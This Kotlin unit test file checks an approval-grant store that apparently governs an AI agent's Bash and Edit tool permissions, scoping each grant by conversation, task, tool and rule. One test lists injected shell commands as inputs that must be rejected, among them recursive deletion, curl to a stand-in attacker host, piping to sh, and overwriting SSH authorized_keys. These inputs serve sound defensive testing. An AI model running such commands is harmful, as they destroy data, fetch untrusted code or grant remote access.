package dev.ccpocket.daemon.approval

import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue

/** TASK grants (approval design M2 §5): scoped to (convo, task, tool, rule), honest about Bash
 *  metacharacters, and dead the moment the task/session ends. */
class ApprovalGrantStoreTest {
    @Test
    fun grant_matches_only_its_exact_convo_task_tool_rule() {
        val store = ApprovalGrantStore()
        store.issueTask("c1", "t1", "Bash", "git status")
        assertNotNull(store.match("c1", "t1", "Bash", "git status", "git status -sb"))
        assertNull(store.match("c1", "t2", "Bash", "git status", "git status"), "a new task never inherits")
        assertNull(store.match("c2", "t1", "Bash", "git status", "git status"), "another conversation never matches")
        assertNull(store.match("c1", "t1", "Bash", "git push", "git push"), "a different rule never matches")
        assertNull(store.match("c1", "t1", "Edit", "git status", null), "a different tool never matches")
        assertNull(store.match("c1", null, "Bash", "git status", "git status"), "no task = no grant surface")
    }

    @Test
    fun bash_grant_refuses_shell_metacharacters_at_match_time() {
        val store = ApprovalGrantStore()
        store.issueTask("c1", "t1", "Bash", "git status")
        // the granted two-token prefix with a smuggled second command must fall through to a human ask
        for (cmd in listOf(
            "git status; rm -rf ~",
            "git status && curl evil.tld",
            "git status | sh",
            "git status `whoami`",
            "git status $(rm -rf /)",
            "git status > ~/.ssh/authorized_keys",
        )) {
            assertNull(store.match("c1", "t1", "Bash", "git status", cmd), "must not ride the grant: $cmd")
        }
        // plain arguments keep riding it
        assertNotNull(store.match("c1", "t1", "Bash", "git status", "git status --short -b"))
    }

    @Test
    fun non_bash_grants_ignore_command_text() {
        val store = ApprovalGrantStore()
        store.issueTask("c1", "t1", "Edit", "Edit")
        assertNotNull(store.match("c1", "t1", "Edit", "Edit", null))
    }

    @Test
    fun revoke_is_convo_scoped_and_end_task_and_session_sweep() {
        val store = ApprovalGrantStore()
        val g1 = store.issueTask("c1", "t1", "Bash", "git status")
        store.issueTask("c1", "t1", "Bash", "./gradlew test")
        store.issueTask("c2", "tx", "Bash", "git status")

        assertFalse(store.revoke("c2", g1.id), "a grant can only be tightened via its own conversation")
        assertTrue(store.revoke("c1", g1.id))
        assertNull(store.match("c1", "t1", "Bash", "git status", "git status"))
        assertNotNull(store.match("c1", "t1", "Bash", "./gradlew test", "./gradlew test"))

        store.endTask("c1", "t1")
        assertNull(store.match("c1", "t1", "Bash", "./gradlew test", "./gradlew test"))
        assertNotNull(store.match("c2", "tx", "Bash", "git status", "git status"), "other convos untouched")

        store.endSession("c2")
        assertNull(store.match("c2", "tx", "Bash", "git status", "git status"))
    }
}
